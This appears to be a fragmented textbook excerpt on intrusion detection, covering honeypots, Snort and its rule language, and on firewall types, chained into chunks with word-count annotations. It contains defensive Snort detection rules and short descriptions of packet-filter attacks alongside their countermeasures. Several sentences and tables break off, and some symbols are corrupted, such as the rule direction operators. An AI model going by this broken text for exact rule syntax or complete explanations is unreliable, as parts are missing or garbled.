[Word Count: 14]

The specification defines formats for event and alert messages, message types, 
and exchange protocols for communication of intrusion detection information.
[Word Count: 20]

A further component of intrusion detection technology is the honeypot. Honeypots 
are decoy systems that are designed to lure a potential attacker away from critical 
systems. Honeypots are designed to:
[Word Count: 30]

• Divert an attacker from accessing critical systems.
 
• Collect information about the attacker’s activity.
 
• Encourage the attacker to stay on the system long enough for administrators
[Word Count: 28]

These systems are filled with fabricated information designed to appear valu-
able but that a legitimate user of the system would not access. Thus, any access to 
the honeypot is suspect. The system is instrumented with sensitive monitors and 
event loggers that detect these accesses and collect information about the attack-
er’s activities. Because any attack against the honeypot is made to seem successful, 
administrators have time to mobilize and log and track the attacker without ever 
exposing productive systems.
[Word Count: 80]

The honeypot is a resource that has no production value. There is no legiti-
mate reason for anyone outside the network to interact with a honeypot. Thus, any 
attempt to communicate with the system is most likely a probe, scan, or attack. Con-
versely, if a honeypot initiates outbound communication, the system has probably 
been compromised.
[Word Count: 56]

Honeypots are typically classified as being either low or high interaction.
[Word Count: 11]

• Low interaction honeypot: Consists of a software package that emulates par-
[Word Count: 12]

ticular IT services or systems well enough to provide a realistic initial interac-
tion, but does not execute a full version of those services or systems.
 
• High interaction honeypot: Is a real system, with a full operating system, serv-
[Word Count: 40]

ices and applications, which are instrumented and deployed where they can be 
accessed by attackers.
[Word Count: 15]

Initial efforts involved a single honeypot computer with IP addresses designed 
to attract hackers. More recent research has focused on building entire honeypot 
networks that emulate an enterprise, possibly with actual or simulated traffic and 
data. Once hackers are within the network, administrators can observe their behav-
ior in detail and figure out defenses.
[Word Count: 54]

Honeypots can be deployed in a variety of locations. Figure 8.8 illustrates 
some possibilities. The location depends on a number of factors, such as the type
[Word Count: 26]

Honeypot
Service network
(Web, mail, DNS, etc.)
[Word Count: 7]

Figure 8.8  Example of Honeypot Deployment
[Word Count: 6]

­firewall either has to open up the traffic beyond what is permissible, which is risky, 
or limit the effectiveness of the honeypot.
[Word Count: 22]

Snort is an open source, highly configurable and portable host-based or network-based 
IDS. Snort is referred to as a lightweight IDS, which has the following characteristics:
[Word Count: 26]

• Easily deployed on most nodes (host, server, router) of a network.
 
• Efficient operation that uses small amount of memory and processor time.
 
• Easily configured by system administrators who need to implement a specific
[Word Count: 36]

security solution in a short amount of time.
[Word Count: 8]

Snort can perform real-time packet capture, protocol analysis, and content ­searching 
and matching. Snort is mainly designed to analyze TCP, UDP, and ICMP network pro-
tocols, though it can be extended with plugins for other protocols. Snort can detect a vari-
ety of attacks and probes, based on a set of rules configured by a system administrator.
[Word Count: 57]

A Snort installation consists of four logical components (Figure 8.9):
[Word Count: 10]

• Packet decoder: The packet decoder processes each captured packet to
[Word Count: 11]

­identify and isolate protocol headers at the data link, network, transport, and
[Word Count: 12]

application layers. The decoder is designed to be as efficient as possible and its 
primary work consists of setting pointers so that the various protocol headers 
can be easily extracted.
 
• Detection engine: The detection engine does the actual work of intrusion
[Word Count: 42]

detection. This module analyzes each packet based on a set of rules defined 
for this configuration of Snort by the security administrator. In essence, each 
packet is checked against all the rules to determine if the packet matches 
the characteristics defined by a rule. The first rule that matches the decoded 
packet triggers the action specified by the rule. If no rule matches the packet, 
the detection engine discards the packet.
 
• Logger: For each packet that matches a rule, the rule specifies what logging
[Word Count: 85]

and alerting options are to be taken. When a logger option is selected, the log-
ger stores the detected packet in human readable format or in a more compact 
binary format in a designated log file. The security administrator can then use 
the log file for later analysis.
 
• Alerter: For each detected packet, an alert can be sent. The alert option in the
[Word Count: 64]

matching rule determines what information is included in the event notifica-
tion. The event notification can be sent to a file, to a UNIX socket, or to a 
database. Alerting may also be turned off during testing or penetration stud-
ies. Using the UNIX socket, the alert can be sent to a management machine 
elsewhere on the network.
[Word Count: 58]

A Snort implementation can be configured as a passive sensor, which moni-
tors traffic but is not in the main transmission path of the traffic, or an inline sensor, 
through which all packet traffic must pass. In the latter case, Snort can perform 
intrusion prevention as well as intrusion detection. We defer a discussion of intru-
sion prevention to Chapter 9.
[Word Count: 61]

Snort uses a simple, flexible rule definition language that generates the rules used 
by the detection engine. Although the rules are simple and straightforward to write, 
they are powerful enough to detect a wide variety of hostile or suspicious traffic.
[Word Count: 40]

Each rule consists of a fixed header and zero or more options (Figure 8.10). 
The header has the following elements:
[Word Count: 20]

• Action: The rule action tells Snort what to do when it finds a packet that
[Word Count: 16]

matches the rule criteria. Table 8.3 lists the available actions. The last three 
actions in the list (drop, reject, sdrop) are only available in inline mode.
[Word Count: 26]

• Protocol: Snort proceeds in the analysis if the packet protocol matches this field.
[Word Count: 14]

The current version of Snort (2.9) recognizes four protocols: TCP, UDP, ICMP, 
and IP. Future releases of Snort will support a greater range of protocols.
 
• Source IP address: Designates the source of the packet. The rule may specify a
[Word Count: 40]

specific IP address, any IP address, a list of specific IP addresses, or the nega-
tion of a specific IP address or list. The negation indicates that any IP address 
other than those listed is a match.
 
• Source port: This field designates the source port for the specified protocol (e.g.,
[Word Count: 51]

a TCP port). Port numbers may be specified in a number of ways, including spe-
cific port number, any ports, static port definitions, ranges, and by negation.
 
• Direction: This field takes on one of two values: unidirectional (-7) or bidi-
[Word Count: 41]

rectional (6-7). The bidirectional option tells Snort to consider the address/
port pairs in the rule as either source followed by destination or destination 
followed by source. The bidirectional option enables Snort to monitor both 
sides of a conversation.
 
• Destination IP address: Designates the destination of the packet.
 
• Destination port: Designates the destination port.
[Word Count: 56]

Following the rule header may be one or more rule options. Each option 
consists of an option keyword, which defines the option; followed by arguments, 
which specify the details of the option. In the written form, the set of rule options is 
separated from the header by being enclosed in parentheses. Snort rule options are 
separated from each other using the semicolon (;) character. Rule option keywords 
are separated from their arguments with a colon (:) character.
[Word Count: 77]

There are four major categories of rule options:
[Word Count: 8]

• Meta-data: Provide information about the rule but do not have any affect dur-
[Word Count: 14]

ing detection.
 
• Payload: Look for data inside the packet payload and can be interrelated.
 
• Non-payload: Look for non-payload data.
 
• Post-detection: Rule-specific triggers that happen after a rule has matched a packet.
[Word Count: 34]

alert
Generate an alert using the selected alert method, and then log the packet.
[Word Count: 14]

activate
Alert and then turn on another dynamic rule.
[Word Count: 9]

dynamic
Remain idle until activated by an activate rule, then act as a log rule.
[Word Count: 15]

drop
Make iptables drop the packet and log the packet.
[Word Count: 10]

reject
Make iptables drop the packet, log it, and then send a TCP reset if the protocol 
is TCP or an ICMP port unreachable message if the protocol is UDP.
[Word Count: 30]

sdrop
Make iptables drop the packet but does not log it.
[Word Count: 11]

Table 8.4 provides examples of options in each category.
Here is an example of a Snort rule:
[Word Count: 17]

Alert tcp $EXTERNAL_NET any -> $HOME_NET any\
(msg: “SCAN SYN FIN” flags: SF, 12;\
reference: arachnids, 198; classtype: attempted-recon;)
[Word Count: 19]

In Snort, the reserved backslash character “\” is used to write instructions 
on multiple lines. This example is used to detect a type of attack at the TCP level 
known as a SYN-FIN attack. The names $EXTERNAL_NET and $HOME_NET 
are predefined variable names to specify particular networks. In this example, any 
source port or destination port is specified. This example checks if just the SYN
[Word Count: 65]

Table 8.4  Examples of Snort Rule Options
[Word Count: 7]

msg	
Defines the message to be sent when a packet generates an event.
[Word Count: 13]

reference	
Defines a link to an external attack identification system, which provides additional 
­information.
[Word Count: 14]

classtype	
Indicates what type of attack the packet attempted.
[Word Count: 9]

content	
Enables Snort to perform a case-sensitive search for specific content (text and/or 
binary) in the packet payload.
[Word Count: 18]

depth	
Specifies how far into a packet Snort should search for the specified pattern. Depth 
modifies the previous content keyword in the rule.
[Word Count: 23]

offset	
Specifies where to start searching for a pattern within a packet. Offset modifies the 
previous content keyword in the rule.
[Word Count: 21]

nocase	
Snort should look for the specific pattern, ignoring case. Nocase modifies the previ-
ous content keyword in the rule.
[Word Count: 20]

ttl	
Check the IP time-to-live value. This option was intended for use in the detection of 
traceroute attempts.
[Word Count: 18]

id	
Check the IP ID field for a specific value. Some tools (exploits, scanners and other 
odd programs) set this field specifically for various purposes, for example, the value 
31337 is very popular with some hackers.
[Word Count: 36]

dsize	
Test the packet payload size. This may be used to check for abnormally sized pack-
ets. In many cases, it is useful for detecting buffer overflows.
[Word Count: 27]

flags	
Test the TCP flags for specified settings.
[Word Count: 8]

seq	
Look for a specific TCP header sequence number.
[Word Count: 9]

icmp-id	
Check for a specific ICMP ID value. This is useful because some covert channel pro-
grams use static ICMP fields when they communicate. This option was developed to 
detect the stacheldraht DDoS agent.
[Word Count: 34]

logto	
Log packets matching the rule to the specified filename.
[Word Count: 10]

session	
Extract user data from TCP Sessions. There are many cases where seeing what users 
are typing in telnet, rlogin, ftp, or even web sessions is very useful.
[Word Count: 28]

and the FIN bits are set, ignoring reserved bit 1 and reserved bit 2 in the flags octet. 
The reference option refers to an external definition of this attack, which is of type 
attempted-recon.
[Word Count: 34]

[SCAR12] is a detailed and worthwhile treatment of intrusion detection. Two short 
but useful survey articles on the subject are [KENT00] and [MCHU00]. [PRED08] 
gives examples of insider attacks. [LAZA05] and [NING04] survey recent advances 
in intrusion detection techniques. [CHAN09] is a thorough survey of anomaly detec-
tion techniques. A brief overview of anomaly detection techniques is [SAMP13]. 
[CHEN12] analyzes five evasion techniques used in IDS attacks.
[Word Count: 67]

CHAN09	
Chandola, V.; Banerjee, A.; and Kumar, V. “Anomaly Detection: A Survey.” 
ACM Computing Surveys, July 2009.
CHEN12	
Cheng, T., et al. “Evasion Techniques: Sneaking through Your Intrusion 
Detection/Prevention Systems.” IEEE Communications Surveys & 
Tutorials, Fourth Quarter 2012.
KENT00	
Kent, S. “On the Trail of Intrusions into Information Systems.” IEEE 
Spectrum, December 2000.
LAZA05	
Lazarevic, A.; Kumar, V.; and Srivastava, J. “Intrusion Detection: A Survey,” in 
“Managing Cyber Threats: Issues, Approaches and Challenges,” Springer, 2005.
MCHU00	 McHugh, J.; Christie, A.; and Allen, J. “The Role of Intrusion Detection
[Word Count: 88]

Systems.” IEEE Software, September/October 2000.
NING04	
Ning, P., et al. “Techniques and Tools for Analyzing Intrusion Alerts.” 
ACM Transactions on Information and System Security, May 2004.
PRED08	
Predd, J., et al. “Insiders Behaving Badly.” IEEE Security & Privacy, July/
August 2008.
SAMP13	
Sample, C., and Schaffer, K. “An Overview of Anomaly Detection.” IT Pro, 
January/February 2013.
SCAR12	
Scarfone, K., and Mell, P. Guide to Intrusion Detection and Prevention 
Systems. NIST Special Publication SP 800-94 rev 1 (draft), July 2012.
SYMA13	
Symantec Corp. “Internet Security Threat Report,” Vol. 18, April 2013.
VERI13	
Verizon “2013 Data Breach Investigations Report,” 2013.
[Word Count: 98]

8.11	Key Terms, Review Questions, and Problems
[Word Count: 7]

anomaly detection
banner grabbing
base-rate fallacy
false negative
false positive
[Word Count: 10]

hacker
honeypot
host-based IDS
inline sensor
intruder
[Word Count: 7]

intrusion detection
intrusion detection exchange
[Word Count: 5]

8.11 / Key Terms, Review Questions, and Problems   301
[Word Count: 9]

network-based IDS (NIDS)
network sensor
passive sensor
rule-based anomaly
[Word Count: 9]

identification
rule-based penetration
identification
security intrusion
[Word Count: 6]

scanning
signature approaches
signature detection
Snort
[Word Count: 6]

8.3	
Wireless networks present different problems from wired networks for NIDS deploy-
ment because of the broadcast nature of transmission. Discuss the considerations that 
should come into play when deciding on locations for wireless NIDS sensors.
	 8.4	
One of the non-payload options in Snort is flow. This option distinguishes between 
clients and servers. This option can be used to specify a match only for packets flow-
ing in one direction (client to server or vice versa) and can specify a match only on 
established TCP connections. Consider the following Snort rule:
[Word Count: 91]

alert tcp $EXTERNAL_NET any -> $SQL_SERVERS $ORACLE_PORTS\
(msg: “ORACLE create database attempt:;\
flow:  to_server,  established;  content:  “create database”; 
nocase;\
classtype: protocol-command-decode;)
[Word Count: 21]

a.	 What does this rule do?
b.	 Comment on the significance of this rule if the Snort devices is placed inside or
[Word Count: 22]

outside of the external firewall.
	 8.5	
The overlapping area of the two probability density functions of Figure 8.1 represents 
the region in which there is the potential for false positives and false negatives. Fur-
ther, Figure 8.1 is an idealized and not necessarily representative depiction of the rela-
tive shapes of the two density functions. Suppose there is 1 actual intrusion for every 
1000 authorized users, and the overlapping area covers 1% of the authorized users 
and 50% of the intruders.
a.	 Sketch such a set of density functions and argue that this is not an unreasonable
[Word Count: 97]

depiction.
b.	 What is the probability that an event that occurs in this region is that of an autho-
[Word Count: 19]

8.11 / Key Terms, Review Questions, and Problems   303
[Word Count: 9]

Low
1 P1 + 1 P2
Medium
1 P3 + 1 P4
High
2 P4
[Word Count: 15]

9.2	 Firewall Characteristics and Access Policy
[Word Count: 6]

9.3	 Types of Firewalls
Packet Filtering Firewall
Stateful Inspection Firewalls
Application-Level Gateway
Circuit-Level Gateway
[Word Count: 14]

9.4	 Firewall Basing
Bastion Host
Host-Based Firewalls
Personal Firewall
[Word Count: 9]

9.5	 Firewall Location and Configurations
DMZ Networks
Virtual Private Networks
Distributed Firewalls
Summary of Firewall Locations and Topologies
[Word Count: 18]

9.6	 Intrusion Prevention Systems
Host-Based IPS
Network-Based IPS
Distributed or Hybrid IPS
Snort Inline
[Word Count: 14]

9.7	 Example: Unified Threat Management Products
[Word Count: 6]

9.9	 Key Terms, Review Questions, and Problems
[Word Count: 7]

Firewalls and Intrusion 
Prevention Systems
[Word Count: 5]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	 Explain the role of firewalls as part of a computer and network security
[Word Count: 14]

­strategy.
◆	 List the key characteristics of firewalls.
◆	 Discuss the various basing options for firewalls.
◆	 Understand the relative merits of various choices for firewall location and
[Word Count: 28]

configurations.
◆	 Distinguish between firewalls and intrusion prevention systems.
◆	 Define the concept of a unified threat management system.
[Word Count: 19]

Firewalls can be an effective means of protecting a local system or network of 
­systems from network-based security threats while at the same time affording access 
to the outside world via wide area networks and the Internet.
[Word Count: 37]

Information systems in corporations, government agencies, and other organizations 
have undergone a steady evolution. The following are notable developments:
[Word Count: 19]

• Centralized data processing system, with a central mainframe supporting a
[Word Count: 11]

number of directly connected terminals.
 
• Local area networks (LANs) interconnecting PCs and terminals to each other
[Word Count: 17]

and the mainframe.
 
• Premises network, consisting of a number of LANs, interconnecting PCs,
[Word Count: 14]

servers, and perhaps a mainframe or two.
 
• Enterprise-wide network, consisting of multiple, geographically distributed
[Word Count: 15]

premises networks interconnected by a private wide area network (WAN).
 
• Internet connectivity, in which the various premises networks all hook into the
[Word Count: 23]

Internet and may or may not also be connected by a private WAN.
[Word Count: 13]

306    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

The firewall, then, provides an additional layer of defense, insulating the inter-
nal systems from external networks. This follows the classic military doctrine of 
“defense in depth,” which is just as applicable to IT security.
[Word Count: 35]

9.2	 Firewall Characteristics AND ACCESS POLICY
[Word Count: 6]

[BELL94] lists the following design goals for a firewall:
[Word Count: 9]

1.	 All traffic from inside to outside, and vice versa, must pass through the firewall.
[Word Count: 15]

This is achieved by physically blocking all access to the local network except via 
the firewall. Various configurations are possible, as explained later in this chapter.
	
2.	 Only authorized traffic, as defined by the local security policy, will be allowed
[Word Count: 40]

to pass. Various types of firewalls are used, which implement various types of 
security policies, as explained later in this chapter.
	
3.	 The firewall itself is immune to penetration. This implies the use of a hard-
[Word Count: 36]

ened system with a secured operating system. Trusted computer systems are 
suitable for hosting a firewall and often required in government applications. 
This topic is discussed in Chapter 13.
[Word Count: 29]

[SCAR09b] lists a range of characteristics that a firewall access policy could 
use to filter traffic, including:
[Word Count: 17]

• IP Address and Protocol Values: Controls access based on the source or
[Word Count: 13]

destination addresses and port numbers, direction of flow being inbound or 
outbound, and other network and transport layer characteristics. This type of 
filtering is used by packet filter and stateful inspection firewalls. It is typically 
used to limit access to specific services.
[Word Count: 42]

9.2 / Firewall Characteristics AND ACCESS POLICY   307
[Word Count: 8]

• Application Protocol: Controls access on the basis of authorized application
[Word Count: 11]

protocol data. This type of filtering is used by an application-level gateway 
that relays and monitors the exchange of information for specific applica-
tion protocols, e.g., checking SMTP email for spam, or HTPP web requests to 
authorized sites only.
 
• User Identity: Controls access based on the users identity, typically for inside
[Word Count: 52]

users who identify themselves using some form of secure authentication tech-
nology, such as IPSec (Chapter 22).
 
• Network Activity: Controls access based on considerations such as the time or
[Word Count: 30]

request, e.g., only in business hours; rate of requests, e.g., to detect scanning 
attempts; or other activity patterns.
[Word Count: 18]

Before proceeding to the details of firewall types and configurations, it is best 
to summarize what one can expect from a firewall. The following capabilities are 
within the scope of a firewall:
[Word Count: 32]

1.	 A firewall defines a single choke point that attempts to keep unauthorized
[Word Count: 13]

­users out of the protected network, prohibit potentially vulnerable services 
from entering or leaving the network, and provide protection from various 
kinds of IP spoofing and routing attacks. The use of a single choke point 
­simplifies security management because security capabilities are consolidated 
on a single system or set of systems.
	
2.	 A firewall provides a location for monitoring security-related events. Audits
[Word Count: 62]

and alarms can be implemented on the firewall system.
	
3.	 A firewall is a convenient platform for several Internet functions that are not
[Word Count: 23]

security related. These include a network address translator, which maps local 
addresses to Internet addresses, and a network management function that 
audits or logs Internet usage.
	
4.	 A firewall can serve as the platform for IPSec. Using the tunnel mode capa-
[Word Count: 41]

bility described in Chapter 22, the firewall can be used to implement virtual 
private networks.
[Word Count: 15]

Firewalls have their limitations, including the following:
[Word Count: 7]

1.	 The firewall cannot protect against attacks that bypass the firewall. Internal
[Word Count: 12]

systems may have dial-out or mobile broadband capability to connect to 
an ISP. An internal LAN may support a modem pool that provides dial-in 
­capability for traveling ­employees and telecommuters.
[Word Count: 30]

2.	 The firewall may not protect fully against internal threats, such as a disgrun-
[Word Count: 14]

tled employee or an employee who unwittingly cooperates with an external 
attacker.
	
3.	 An improperly secured wireless LAN may be accessed from outside the
[Word Count: 24]

­organization. An internal firewall that separates portions of an enterprise 
­network cannot guard against wireless communications between local systems 
on different sides of the internal firewall.
	
4.	 A laptop, PDA, or portable storage device may be used and infected outside
[Word Count: 40]

the corporate network and then attached and used internally.
[Word Count: 9]

308    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

A firewall can monitor network traffic at a number of levels, from low-level net-
work packets, either individually or as part of a flow, to all traffic within a transport 
connection, up to inspecting details of application protocols. The choice of which 
level is appropriate is determined by the desired firewall access policy. It can oper-
ate as a positive filter, allowing to pass only packets that meet specific criteria, or as
[Word Count: 72]

a negative filter, rejecting any packet that meets certain criteria. The criteria imple-
ment the access policy for the firewall, that we discussed in the previous section. 
Depending on the type of firewall, it may examine one or more protocol headers in 
each packet, the payload of each packet, or the pattern generated by a sequence of 
packets. In this section, we look at the principal types of firewalls.
[Word Count: 69]

A packet filtering firewall applies a set of rules to each incoming and outgoing 
IP packet and then forwards or discards the packet (Figure 9.1b). The firewall 
is typically configured to filter packets going in both directions (from and to 
the internal network). Filtering rules are based on information contained in a 
­network packet:
[Word Count: 54]

• Source IP address: The IP address of the system that originated the IP packet
[Word Count: 15]

(e.g., 192.178.1.1).
 
• Destination IP address: The IP address of the system the IP packet is trying to
[Word Count: 18]

reach (e.g., 192.168.1.2).
 
• Source and destination transport-level address: The transport-level (e.g., TCP
[Word Count: 13]

or UDP) port number, which defines applications such as SNMP or TELNET.
 
• IP protocol field: Defines the transport protocol.
 
• Interface: For a firewall with three or more ports, which interface of the ­firewall
[Word Count: 35]

the packet came from or which interface of the firewall the packet is destined for.
[Word Count: 15]

The packet filter is typically set up as a list of rules based on matches to fields 
in the IP or TCP header. If there is a match to one of the rules, that rule is invoked 
to determine whether to forward or discard the packet. If there is no match to any 
rule, then a default action is taken. Two default policies are possible:
[Word Count: 65]

• Default = discard: That which is not expressly permitted is prohibited.
 
• Default = forward: That which is not expressly prohibited is permitted.
[Word Count: 24]

Table 9.1 is a simplified example of a rule set for SMTP traffic. The goal is to 
allow inbound and outbound email traffic but to block all other traffic. The rules are 
applied top to bottom to each packet. The intent of each rule is:
[Word Count: 45]

1.	 Inbound mail from an external source is allowed (port 25 is for SMTP incoming).
	
2.	 This rule is intended to allow a response to an inbound SMTP connection.
	
3.	 Outbound mail to an external source is allowed.
[Word Count: 38]

310    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

4.	 This rule is intended to allow a response to an inbound SMTP connection.
	
5.	 This is an explicit statement of the default policy. All rule sets include this rule
[Word Count: 30]

4
In
External
25
Internal
TCP
>1023
ACK
Permit
[Word Count: 9]

The rule takes advantage of a feature of TCP connections. Once a connection 
is set up, the ACK flag of a TCP segment is set to acknowledge segments sent from 
the other side. Thus, this rule allows incoming packets with a source port number of 
25 that include the ACK flag in the TCP segment.
[Word Count: 55]

One advantage of a packet filtering firewall is its simplicity. Also, packet ­filters 
typically are transparent to users and are very fast. [SCAR09b] lists the following 
weaknesses of packet filter firewalls:
[Word Count: 31]

• Because packet filter firewalls do not examine upper-layer data, they ­cannot
[Word Count: 12]

prevent attacks that employ application-specific vulnerabilities or func-
tions. For example, a packet filter firewall cannot block specific application
[Word Count: 19]

Rule
Direction
Src address
Dest addresss
Protocol
Dest port
Action
[Word Count: 10]

2
Out
Internal
External
TCP
>1023
Permit
[Word Count: 7]

­commands; if a packet filter firewall allows a given application, all functions 
available within that application will be permitted.
 
• Because of the limited information available to the firewall, the logging
[Word Count: 31]

­functionality present in packet filter firewalls is limited. Packet filter logs 
­normally contain the same information used to make access control decisions 
(source address, destination address, and traffic type).
 
• Most packet filter firewalls do not support advanced user authentication
[Word Count: 40]

schemes. Once again, this limitation is mostly due to the lack of upper-layer 
functionality by the firewall.
 
• Packet filter firewalls are generally vulnerable to attacks and exploits that take
[Word Count: 30]

advantage of problems within the TCP/IP specification and protocol stack, 
such as network layer address spoofing. Many packet filter firewalls cannot 
detect a network packet in which the OSI Layer 3 addressing information has 
been altered. Spoofing attacks are generally employed by intruders to bypass 
the security controls implemented in a firewall platform.
 
• Finally, due to the small number of variables used in access control decisions,
[Word Count: 67]

packet filter firewalls are susceptible to security breaches caused by improper 
configurations. In other words, it is easy to accidentally configure a packet 
filter firewall to allow traffic types, sources, and destinations that should be 
denied based on an organization’s information security policy.
[Word Count: 43]

Some of the attacks that can be made on packet filtering firewalls and the 
appropriate countermeasures are the following:
[Word Count: 19]

• IP address spoofing: The intruder transmits packets from the outside with
[Word Count: 12]

a source IP address field containing an address of an internal host. The 
­attacker hopes that the use of a spoofed address will allow penetration of 
systems that employ simple source address security, in which packets from 
specific trusted internal hosts are accepted. The countermeasure is to discard 
packets with an inside source address if the packet arrives on an external 
interface. In fact, this countermeasure is often implemented at the router 
external to the firewall.
 
• Source routing attacks: The source station specifies the route that a packet
[Word Count: 89]

should take as it crosses the Internet, in the hopes that this will bypass security 
measures that do not analyze the source routing information. A countermeas-
ure is to discard all packets that use this option.
 
• Tiny fragment attacks: The intruder uses the IP fragmentation option to cre-
[Word Count: 49]

312    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

a predefined minimum amount of the transport header. If the first fragment 
is rejected, the filter can remember the packet and discard all subsequent 
fragments.
[Word Count: 25]

In general, when an application that uses TCP creates a session with a remote 
host, it creates a TCP connection in which the TCP port number for the remote 
(server) application is a number less than 1024 and the TCP port number for the 
local (client) application is a number between 1024 and 65535. The numbers less 
than 1024 are the “well-known” port numbers and are assigned permanently to 
particular applications (e.g., 25 for server SMTP). The numbers between 1024 and 
65535 are generated dynamically and have temporary significance only for the 
­lifetime of a TCP connection.
[Word Count: 97]

A simple packet filtering firewall must permit inbound network traffic on all 
these high-numbered ports for TCP-based traffic to occur. This creates a vulnerabil-
ity that can be exploited by unauthorized users.
[Word Count: 32]

A stateful packet inspection firewall tightens up the rules for TCP traffic by 
creating a directory of outbound TCP connections, as shown in Table 9.2. There is 
an entry for each currently established connection. The packet filter will now allow 
incoming traffic to high-numbered ports only for those packets that fit the profile of 
one of the entries in this directory.
[Word Count: 61]

A stateful packet inspection firewall reviews the same packet information 
as a packet filtering firewall, but also records information about TCP connections 
(Figure 9.1c). Some stateful firewalls also keep track of TCP sequence numbers 
to prevent attacks that depend on the sequence number, such as session hijack-
ing. Some even inspect limited amounts of application data for some well-known 
protocols like FTP, IM, and SIPS commands, in order to identify and track related 
connections.
[Word Count: 74]

An application-level gateway, also called an application proxy, acts as a relay of 
application-level traffic (Figure 9.1d). The user contacts the gateway using a TCP/
IP application, such as Telnet or FTP, and the gateway asks the user for the name
[Word Count: 41]

of the remote host to be accessed. When the user responds and provides a valid 
user ID and authentication information, the gateway contacts the application on 
the remote host and relays TCP segments containing the application data between 
the two endpoints. If the gateway does not implement the proxy code for a specific 
application, the service is not supported and cannot be forwarded across the fire-
wall. Further, the gateway can be configured to support only specific features of an 
application that the network administrator considers acceptable while denying all 
other features.
[Word Count: 92]

Application-level gateways tend to be more secure than packet filters. Rather 
than trying to deal with the numerous possible combinations that are to be allowed 
and forbidden at the TCP and IP level, the application-level gateway need only 
scrutinize a few allowable applications. In addition, it is easy to log and audit all 
incoming traffic at the application level.
[Word Count: 59]

A prime disadvantage of this type of gateway is the additional processing 
overhead on each connection. In effect, there are two spliced connections between 
the end users, with the gateway at the splice point, and the gateway must examine 
and forward all traffic in both directions.
[Word Count: 46]

Table 9.2  Example Stateful Firewall Connection State Table
[Word Count: 8]

192.168.1.100
1030
210.9.88.29
80
Established
[Word Count: 5]

192.168.1.102
1031
216.32.42.123
80
Established
[Word Count: 5]

192.168.1.101
1033
173.66.32.122
25
Established
[Word Count: 5]

192.168.1.106
1035
177.231.32.12
79
Established
[Word Count: 5]

223.43.21.231
1990
192.168.1.6
80
Established
[Word Count: 5]

219.22.123.32
2112
192.168.1.6
80
Established
[Word Count: 5]

210.99.212.18
3321
192.168.1.6
80
Established
[Word Count: 5]

24.102.32.23
1025
192.168.1.6
80
Established
[Word Count: 5]

223.21.22.12
1046
192.168.1.6
80
Established
[Word Count: 5]

314    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

A typical use of circuit-level gateways is a situation in which the system 
administrator trusts the internal users. The gateway can be configured to support 
­application-level or proxy service on inbound connections and circuit-level ­functions 
for outbound connections. In this configuration, the gateway can incur the process-
ing overhead of examining incoming application data for forbidden functions but 
does not incur that overhead on outgoing data.
[Word Count: 66]

An example of a circuit-level gateway implementation is the SOCKS package 
[KOBL92]; version 5 of SOCKS is specified in RFC 1928. The RFC defines SOCKS 
in the following fashion:
[Word Count: 29]

The protocol described here is designed to provide a framework for client-
server applications in both the TCP and UDP domains to conveniently and 
securely use the services of a network firewall. The protocol is conceptually 
a “shim-layer” between the application layer and the transport layer, and as 
such does not provide network-layer gateway services, such as forwarding of 
ICMP messages.
[Word Count: 61]

SOCKS consists of the following components:
[Word Count: 6]

• The SOCKS server, which often runs on a UNIX-based firewall. SOCKS is
[Word Count: 13]

also implemented on Windows systems.
 
• The SOCKS client library, which runs on internal hosts protected by the firewall.
 
• SOCKS-ified versions of several standard client programs such as FTP and
[Word Count: 31]

TELNET. The implementation of the SOCKS protocol typically involves 
­either the recompilation or relinking of TCP-based client applications, or the 
use of alternate dynamically loaded libraries, to use the appropriate encapsu-
lation routines in the SOCKS library.
[Word Count: 37]

It is common to base a firewall on a stand-alone machine running a common operat-
ing system, such as UNIX or Linux. Firewall functionality can also be implemented 
as a software module in a router or LAN switch. In this section, we look at some 
additional firewall basing considerations.
[Word Count: 49]

A bastion host is a system identified by the firewall administrator as a critical strong 
point in the network’s security. Typically, the bastion host serves as a platform for 
an application-level or circuit-level gateway. Common characteristics of a bastion 
host are as follows:
[Word Count: 43]

• The bastion host hardware platform executes a secure version of its operating
[Word Count: 13]

system, making it a hardened system.
 
• Only the services that the network administrator considers essential are
[Word Count: 17]

installed on the bastion host. These could include proxy applications for DNS, 
FTP, HTTP, and SMTP.
 
• The bastion host may require additional authentication before a user is allowed
[Word Count: 29]

access to the proxy services. In addition, each proxy service may require its 
own authentication before granting user access.
 
• Each proxy is configured to support only a subset of the standard application’s
[Word Count: 33]

command set.
 
• Each proxy is configured to allow access only to specific host systems. This
[Word Count: 16]

means that the limited command/feature set may be applied only to a subset 
of systems on the protected network.
 
• Each proxy maintains detailed audit information by logging all traffic, each
[Word Count: 31]

connection, and the duration of each connection. The audit log is an essential 
tool for discovering and terminating intruder attacks.
 
• Each proxy module is a very small software package specifically designed for net-
[Word Count: 34]

work security. Because of its relative simplicity, it is easier to check such ­modules 
for security flaws. For example, a typical UNIX mail application may contain 
over 20,000 lines of code, while a mail proxy may contain fewer than 1,000.
 
• Each proxy is independent of other proxies on the bastion host. If there is a
[Word Count: 56]

problem with the operation of any proxy, or if a future vulnerability is discov-
ered, it can be uninstalled without affecting the operation of the other proxy 
applications. Also, if the user population requires support for a new service, the 
network administrator can easily install the required proxy on the bastion host.
 
• A proxy generally performs no disk access other than to read its initial config-
[Word Count: 67]

uration file. Hence, the portions of the file system containing executable code 
can be made read only. This makes it difficult for an intruder to install Trojan 
horse sniffers or other dangerous files on the bastion host.
 
• Each proxy runs as a nonprivileged user in a private and secured directory on
[Word Count: 52]

A host-based firewall is a software module used to secure an individual host. Such 
modules are available in many operating systems or can be provided as an ­add-on 
package. Like conventional stand-alone firewalls, host-resident firewalls filter and 
restrict the flow of packets. A common location for such firewalls is a server. There 
are several advantages to the use of a server-based or workstation-based firewall:
[Word Count: 64]

316    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

• Filtering rules can be tailored to the host environment. Specific corporate
[Word Count: 12]

­security policies for servers can be implemented, with different filters for 
s­ervers used for different application.
 
• Protection is provided independent of topology. Thus both internal and exter-
[Word Count: 28]

nal attacks must pass through the firewall.
 
• Used in conjunction with stand-alone firewalls, the host-based firewall
[Word Count: 17]

­provides an additional layer of protection. A new type of server can be added 
to the network, with its own firewall, without the necessity of altering the 
­network firewall configuration.
[Word Count: 30]

A personal firewall controls the traffic between a personal computer or workstation 
on one side and the Internet or enterprise network on the other side. Personal fire-
